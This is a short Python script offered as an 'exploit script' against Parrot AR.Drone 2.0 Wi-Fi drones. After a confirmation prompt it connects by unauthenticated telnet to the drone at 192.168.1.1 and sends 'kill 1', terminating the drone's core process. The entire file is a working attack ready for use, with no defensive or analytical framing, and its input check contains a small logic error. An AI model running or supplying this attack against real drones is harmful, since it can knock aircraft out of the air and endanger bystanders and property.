import time
import sys
import telnetlib

print("ARattack exploit script for Parrot AR.Drone 2.0 Wi-Fi drones")
print("Written by Aden of Min SecuriTek\n")
print("In order for this script to work, you must be connected to a valid AR.Drone 2.0 control network. Their SSIDs usually begin with 'ardrone_'.")
conf = input("Are you connected to an AR.Drone 2.0 network and ready to attack? [Y/N]: ")
if conf == "Y":
		print("Launching Attack...")
		telnet = telnetlib.Telnet("192.168.1.1")
		time.sleep(0.1)
		telnet.write(('kill 1\n').encode('ascii'))
if conf == "N":
		print("Aww, maybe next time :(\n")
		
if conf !="Y" and "N":
		print("Oops! Invalid input. Please check capitalization and typing.")